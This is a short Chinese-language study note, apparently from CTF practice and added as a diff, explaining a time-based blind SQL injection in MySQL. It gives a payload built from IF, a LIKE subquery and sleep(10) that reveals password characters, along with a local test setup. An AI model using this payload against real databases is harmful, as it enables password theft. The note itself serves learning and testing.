@@ -1,0 +1,43 @@
+攻擊手法:
+select * from users where username='root' and if(1=(SELECT 1 FROM users WHERE password LIKE 's%'),sleep(10),0);
+
+說明:
+select 1 from users where password LIKE 's%' : 如果 password 有 s 開頭的, 則有幾個久顯示幾個值為 1 的 row, 沒有的話回傳 NULL
+
+
+1 個
+ -
+|1|
+ -
+|1|
+ -
+
+2 個
+ -
+|1|
+ -
+|1|
+|1|
+ -
+
+在 if 條件裡只能顯示 1 個, 不然會出錯 ( 該值會與 1 比較 if(1=(xxx),...)  )
+
+註: if (condition, success, fail)
+
+如果成功回傳 sleep(10)
+否則回傳 0
+
+
+
+實際測試:
+
+$ mysql -u root -p
+use ctf;
+create table users (
+    username VARCHAR(100),
+    password VARCHAR(100)
+);
+
+insert into users (username, password) values ('root', 'secret');
+
+select * from users where username='root' and if(1=(SELECT 1 FROM users WHERE password LIKE 's%'),sleep(10),0);
